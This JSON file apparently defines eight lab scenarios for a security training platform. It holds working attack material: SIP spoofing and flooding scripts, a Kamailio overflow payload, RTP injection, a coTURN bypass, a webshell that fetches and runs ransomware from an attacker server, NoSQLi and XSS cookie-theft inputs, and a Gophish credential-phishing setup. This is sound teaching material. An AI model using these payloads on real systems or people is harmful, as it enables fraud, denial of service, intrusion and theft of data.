[{
  "_id": "693039d852c973030509716d",
  "id": 1,
  "name": "SIP Spoofing",
  "description": "### Description\nIn this scenario, the attack consists of sending a SIP Message from an unregistered user impersonating another user (spoofing).",
  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor the attack, the Linphone application is used and a user must be registered. FreeSWITCH provides default users ranging from <b>1000</b> to <b>1020</b> (it is recommended to use one of these).\nThe username corresponds to the chosen value, while the password is <b>1234</b>.\nTo complete the registration, the SIP server must be specified. The IP address of the VM hosting the containers is used:\n\n![registration](/labs/1_2_sip_spoofing_dos_freeswitch/img/1001.png)\n\nOnce the <i>attacker</i> container is running, it can be accessed with:\n```bash\ndocker exec -it attacker sh\n```\nand the python script can be executed:\n```bash\npython3 spoofing.py <IP_VM> <clientSIP>\n```\nwhere:\n- `IP_VM` is the IP address of the VM (FreeSWITCH container);\n- `clientSIP` is the number of the SIP client (linphone).\n\nThe script used is:\n```python\nimport sys, socket, random, string\n\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\next = sys.argv[2]\nrand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))\nmsg=\"MESSAGE sip:%s@%s SIP/2.0\\r\\n\" % (ext, UDP_IP)\nmsg+=\"Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\\r\\n\" % rand\nmsg+=\"Max-Forwards: 70\\r\\n\"\nmsg+=\"From: <sip:UniCredit@%s>;tag=%s\\r\\n\" %(UDP_IP, rand)\nmsg+=\"To: <sip:%s@%s>\\r\\n\" %(ext, UDP_IP)\nmsg+=\"Call-ID: %s\\r\\n\" % rand\nmsg+=\"CSeq: 1 MESSAGE\\r\\n\"\nmsg+=\"Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\\r\\n\"\nmsg+=\"Content-Type: text/plain\\r\\n\"\nmsg+=\"Content-Length: 81\\r\\n\\r\\n\"\nmsg+=\"A withdrawal of €2,000 has been made.\\nFor more information, call 321 757 75 11.\"\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n```\n\nBecause the server does not verify that the sender is registered (i.e. ```auth-messages = false``` by default), the spoofed message will be accepted — resulting in the spoofed user (e.g. ```UniCredit```) appearing to send the message.\n\nThe following message will appear:\n\n![spoofing](/labs/1_2_sip_spoofing_dos_freeswitch/img/message_unicredit.png)",
  "containers": [
    "freeswitch",
    "attacker"
  ]
},
{
  "_id": "6932f80b2d8f45f1aec9f60c",
  "id": 2,
  "name": "SIP Flooding",
  "description": "### Description\nIn the attack, continuous registration requests are sent to the FreeSWITCH server, causing the container to crash (DoS via SIP Flooding).",
  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nOnce the <i>attacker</i> container is running, it can be accessed with:\n\n```bash\ndocker exec -it attacker sh\n```\nand the python script can be executed:\n\n```bash\npython3 dos-sipflood.py <IP_VM>\n```\n **Note**: ```IP_VM``` is the IP address of the VM (FreeSWITCH container).\n\nThe script below repeatedly sends SIP REGISTER requests to the FreeSWITCH server:\n```python\nimport socket, string, random, sys\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ncseq = 1\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\n\nwhile True:\n    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n    \n    msg = \"REGISTER sip:%s SIP/2.0\\r\\n\" % (UDP_IP, )\n    msg += \"Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"Max-Forwards: 70\\r\\n\"\n    msg += \"From: <sip:98647499@%s>;tag=%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"To: <sip:98647499@%s>\\r\\n\" % (UDP_IP, )\n    msg += \"Call-ID: %s\\r\\n\" % (r, )\n    msg += \"CSeq: %s REGISTER\\r\\n\" % (cseq, )\n    msg += \"Contact: <sip:98647499@%s:46786;transport=udp>\\r\\n\" % (UDP_IP, )\n    msg += \"Expires: 60\\r\\n\"\n    msg += \"Content-Length: 0\\r\\n\"\n    msg += \"\\r\\n\" \n\n    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n\n    cseq += 1\n```\nBecause the server must allocate resources to process each registration, memory is exhausted and the FreeSWITCH container crashes. \n\nOn VM, you can observe this by monitoring the container with `docker stats`: after some time memory consumption grows until it hits the limit, then the container terminates. \n\nBefore: \n\n![docker_stats](/labs/1_2_sip_spoofing_dos_freeswitch/img/dockerstats.png)\n\nAfter:\n\n![termination](/labs/1_2_sip_spoofing_dos_freeswitch/img/termination.png)",
  "containers": [
    "freeswitch",
    "attacker"
  ]
},
{
  "_id": "69303a0a52c973030509716e",
  "id": 3,
  "name": "SIP Overflow",
  "description": "### Description\nIn this scenario, due to a malformed request sent to the server, it crashes because of Memory Corruption: the data is written beyond the dynamically allocated memory.",
  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThen, access the <i>sipp101</i> container:\n```bash\ndocker exec -it sipp101 bash\n```\nThe malformed message is sent using:\n```bash\nsipp -sf /sipp/xml/overflow.xml <IP_VM> -m 1\n```\nwhere:\n- `-sf /sipp/xml/overflow.xml` indicates the XML file containing the malformed SIP Register request;\n- `IP_VM` is the IP address of the VM hosting the containers (Kamailio container);\n- `-m 1` specifies that only one message is sent.\n\nThe script used is:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE scenario SYSTEM \"sipp.dtd\">\n<scenario name=\"overflow\">\n  <send>\n    <![CDATA[\n    REGISTER sip:[remote_ip]:[remote_port] SIP/2.0\n    Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\n    To: <sip:1@[remote_ip]:[remote_port]>\n    From: Test <sip:2@localhost:5060>;tag=\n    Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\n    Contact: sip:1@127.0.0.1:53497\n    Max-Forwards: 70\n    CSeq: 10086 REGISTER\n    User-Agent: go SIP fuzzer/1\n    Content-Length: 0\n    ]]>\n  </send>\n  \n</scenario>\n```\nIf a REGISTER request contains a malformed or excessively long  ```branch``` parameter or ```From tag``` — fields that are not properly bounded in vulnerable versions — the call to ```tmx_check_pretran()``` function in ```tmx_pretran.c``` file will trigger an off-by-one heap-based buffer overflow, causing a segmentation fault and crashing the container. \n\nIn an other ttyd terminal run ```docker ps -a```. The effect is shown below:\n\n![segmentation_fault](labs/3_heap_overflow_kamailio/img/exit_of_kamailio.png)",
  "containers": [
    "kamailio",
    "sipp101"
  ]
},
{
  "_id": "69303a1852c973030509716f",
  "id": 4,
  "name": "RTP Injection",
  "description": "### Description\nIn this scenario, after two clients establish a communication, an attacker can intercept the RTP traffic (due to the RTP Bleed vulnerability) and inject malicious audio into the conversation.",
  "steps": "### How to reproduce the issue\n\nThe first step is to update the ```EXTERNAL_IP``` variable with you machine's IP address and ```LOCAL_NET``` variable with your network in ```docker-compose.yaml``` (in the ```asterisk``` container). Then start the virtual machine by clicking the button above.\n\nFor this scenario, the Linphone application must be used to simulate the SIP clients.\nUsers <b>7001</b> e <b>7002</b> are registered. Below is the registration of user 7001 (the registration procedure for 7002 is analogous):\n\n![registration](/labs/4_rtp_bleed_injection_asterisk/img/7001_registration.png)\n\n**Note**: Use your machine's IP address.\n\nThe Wireshark container is started to observe the port used for RTP traffic (in the example, RTP uses ports between <b>10000</b> and <b>10099</b>). \n\nTo run Wireshark with a graphical interface from the container, you need to allow local root users to access the host’s display. This can be done on the host machine with:\n```bash\nxhost +local:root\n```\nThen the user can use the following command:\n```bash\ndocker exec -it wireshark wireshark\n```\nThe network interface is selected, and a call is initiated between Linphone 7001 and 7002:\n\n![call](labs/4_rtp_bleed_injection_asterisk/img/call.png)\n\nOn Wireshark you can see the port used for the communication:\n\n![wireshark](labs/4_rtp_bleed_injection_asterisk/img/wireshark_inject.png)\n\nIn an other ttyd terminal, access the <i>sippts</i> container:\n```bash\ndocker exec -it sippts bash\n```\nand run:\n```bash\nsippts rtpbleedinject -i <IP_VM> -r <port_number> -f audio.wav\n```\nwhere:\n- ```rtpbleedinject``` indicates the type of attack, namely RTP Injection;\n- ```-i <IP_VM>``` represents the IP address of the VM running the Asterisk server;\n- ```-r <port_number>``` represents the previously identified port number;\n- ```-f audio.wav``` indicates the audio file injected into the conversation.\n\nIn the vulnerable versions, if ```nat = yes```, the RTP proxies can automatically learn the attacker's IP and port and send the RTP legitimate traffic to him. After that, the attacker can send a malicious audio and degradeted the connection.",
  "containers": [
    "asterisk",
    "sippts",
    "wireshark"
  ]
},
{
  "_id": "69303a2552c9730305097170",
  "id": 5,
  "name": "Relay Abuse",
  "description": "### Description\nIn this scenario, after creating a socks5 proxy to the TURN server, it is possible using specific HTTP GET requests to access the loopback interface of the server.",
  "steps": "### How to reproduce the issue\nThe first step is to update the TURN server's IP address with you machine's IP in ```docker-compose.yaml``` (```stunner``` container), then start the virtual machine by clicking the button above.\n\nThe <i>coTURN</i> container is started automatically with the following command:\n```bash\nturnserver -v --user=username1:password1\n```\nSo its behavior can be observed by following the logs:\n```bash\ndocker logs coturn --follow\n```\nThe <i>STUNner</i> container is started automatically with the following command:\n```bash\nstunner socks --turnserver <IP_VM>:3478 --protocol tcp --username username1 --password password1 --listen 0.0.0.0:9999\n```\nThis command creates a `socks5` server connected to the TURN server. It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `0.0.0.0:9999`.\n\nSo its behavior can be observed by following the logs:\n```bash\ndocker logs stunner --follow\n```Access the <i>coturn</i> container and start a web server on the IPv6 loopback interface:\n```bash\ndocker exec -it coturn sh\npython3 -m http.server 8000 --bind ::1\n```\nKeep this terminal open.\n\nIn another terminal inside the stunner container, test the access control bypass:\n\n**Test 1 - Standard loopback (blocked):**\n```bash\ndocker exec -it stunner sh\ncurl -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000\n```\nThis request is **blocked** (coTURN correctly blocks requests toward standard loopback addresses):\n\n![127.0.0.1](labs/5_coturn_access_bypass/img/127.0.0.1.png)\n\n**Test 2 - IPv6 loopback bypass (VULNERABLE):**\n```bash\ncurl -x socks5h://127.0.0.1:9999 'http://[::1]:8000/'\n```\nThis request **succeeds** - the loopback protection is bypassed using IPv6 loopback address `[::1]`:\n\n![::1](labs/5_coturn_access_bypass/img/__1.png)\n\n**Test 3 - IPv6 wildcard bypass (VULNERABLE):**\n```bash\ncurl -x socks5h://127.0.0.1:9999 'http://[::]:8000/'\n```\nThis also **succeeds** - using IPv6 wildcard address `[::]` also bypasses the protection:\n\n![::](labs/5_coturn_access_bypass/img/__.png)\n\n**Note:** The bypass using `0.0.0.0` may not work reliably on all systems due to kernel-specific TCP connection behavior.\n",
  "containers": [
    "coturn",
    "stunner"
  ]
},
{
  "_id": "69303a4652c9730305097171",
  "id": 6,
  "name": "Remote Code Execution",
  "description": "### Description\nIn this scenario, it is possible to upload a malicious javaScript file to execute a webshell on the victim machine. Once this is done, the attacker loads the python ransomware file from his HTTP server and executes it through the webshell. The effect is the encryption of the files on the victim machine.",
  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nAccess ```http://localhost:8080```:\n\n![index.html](labs/6_socketIOFile_webshell/img/chat.png)\n\nUpload the ```webshell.js``` file, located in the ```public/labs/6_socketIOFile``` path: \n\n![webshell.js](labs/6_socketIOFile_webshell/img/upload_file.png)\n\nOnce uploaded, a communication channel with the victim machine is established. This is possible because, in the vulnerable versions, the server doesn't check the file format and saves it of victime machine. If you access to ```node_socketiofile``` container with:\n```bash\ndocker exec -it node_socketiofile bash\n```\nyou can see the uploaded file:\n\n![saving](labs/6_socketIOFile_webshell/img/salvataggio_file.txt.png)\n\nOn ttyd terminal an attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:\n```bash\npython3 -m http.server 8000\n```\n\nFrom the browser, the file can be downloaded using the following HTTP request:\n```bash\nhttp://localhost:8080/webshell.js/?cmd=wget http://<IP_VM>:8000/ransomware.py\n```\n\n![ransomware.py](labs/6_socketIOFile_webshell/img/load_ransomware.py.png)\n\nThe file is then moved into the appropriate directory:\n```bash\nhttp://localhost:8080/webshell.js/?cmd=mv ransomware.py ./public/\n```\nFinally, the attack is launched:\n```bash\nhttp://localhost:8080/webshell.js/?cmd=python3 ./public/ransomware.py\n```\nThe effect is the encryption of all files contained in the ```public``` directory of the web server:\n\n![encrypted](labs/6_socketIOFile_webshell/img/index_crypted.png)",
  "containers": [
    "node_socketiofile"
  ]
},
{
  "_id": "69303a6052c9730305097172",
  "id": 7,
  "name": "NoSQLi and XSS",
  "description": "### Description\nIn this scenario, by inserting specific input values, it is possible to bypass login controls and access the VDO.Ninja platform. Then, using a particular query string, sensitive information (e.g., cookies) can be extracted.",
  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe web page is accessed through a browser at: ```http://localhost:9000``` and insert your credentials.\n\nIn the vulnerable versions, the ```_bsontype``` attribute is ignored by server, and therefore by entering any username or password, access is granted:\n\n![bypass](labs/7_8_vdo.ninja_xss_nosqli/img/welcome.png)\n\nAfter being redirected to: ```http://localhost:80```, a new attack can be performed. Using:\n```bash\nhttp://localhost:80/examples/control.html?room=<img src=x onerror=alert(document.cookie)>\n```\nthe page’s cookies are obtained:\n\n![cookie](labs/7_8_vdo.ninja_xss_nosqli/img/hacked.png)\n\nFor the vulnerable versions, there is no sanification of this particular input.",
  "containers": [
    "node_mongoose",
    "vdoninja"
  ]
},
{
  "_id": "6932f7022d8f45f1aec9f60b",
  "id": 8,
  "name": "Permission Abuse",
  "description": "### Description\nIn this scenario, after launching the phishing campaign, the user receives the email. He decides to click the button and is redirected to the landing page managed by the attacker. On this page, he enters his data, which is captured by the attacker, and is then redirected to his intended web page. On this page, the user grants permissions to access the microphone. Believing these permissions are used for chat purposes, the user inadvertently allows the attacker to access the audio stream, which can then be used on third-party sites.",
  "steps": "### How to reproduce the issue\nTo run Firefox with a graphical interface from the container, it is necessary to allow local root users to access the host display. On the host machine, execute:\n```bash\nxhost +local:root\n```\nThen start <i>firefox</i> container with:\n```bash\ndocker exec -it firefox bash\nfirefox\n```\nIn another terminal, access the <i>gophish</i> container and start the service:\n```bash\ndocker exec -it gophish bash\n./gophish\n```\nNext, open ```https://127.0.0.1:3333``` in the Firefox browser. Log in using ```admin``` as the username and ```admin123``` as the password.\n\nAs first step, create a sending profile.\n\nTo do this, create a Gmail account that can be used to send emails. Use this account to populate the fields 'SMTP From' and 'Username'. As the password, you can use your account password or an App password (in this case, two-factor authentication must be  enabled).\n\nThe sending profile is shown below:\n\n![sending_profile](labs/9_firefox_access_cam_web/img/sending_profiles.png)\n\nThe landing page (used to capture user credentials after clicking the email link) is already configured:\n\n![landing_page](labs/9_firefox_access_cam_web/img/landing_page.png)\n\nThe email template used for the phishing message is also already available. You only need to configure the 'Envelope Sender' field:\n\n![email_template](labs/9_firefox_access_cam_web/img/email_template.png)\n\nDefine the group of target users who will receive the phishing email - use your email:\n\n![group](labs/9_firefox_access_cam_web/img/users_group.png)\n\nFinally, create and launch a new campaign by selecting:\n- the sending profile;\n- the landing page;\n- the email template;\n- the target groups.\n\n**Note**: Set as URL: ```http://localhost:81```\n\nThe effect is that the email is delivered to the user:\n\n![email](/labs/9_firefox_access_cam_web/img/email.png)\n\nThe user clicks the button and is redirected to the landing page:\n\n![login](/labs/9_firefox_access_cam_web/img/login_page.png)\n\nBy entering their credentials, the user is in fact providing them to the attacker:\n\n![details](/labs/9_firefox_access_cam_web/img/details.png)\n\nAt this point, the user is redirected to the attacker’s page. By granting access to the microphone (and checking the *'Remember this decision'* option) for what appears to be a conversation, the user is effectively allowing the attacker to reuse these permissions on third-party pages (```home.html```).\n\nOn ```home.html```, by exploiting the previously granted premission, the attacker can capture the user's audio and save it. \n\nAccess on <i>node_firefox</i> container:\n\n```bash\ndocker exec -it node_firefox bash\n```\n\nthen navigate to the ```data/audio``` directory to view the user's recorded audio:\n\n![audio_file](labs/9_firefox_access_cam_web/img/audio_rec.png)",
  "containers": [
    "node_firefox",
    "gophish",
    "firefox"
  ]
}]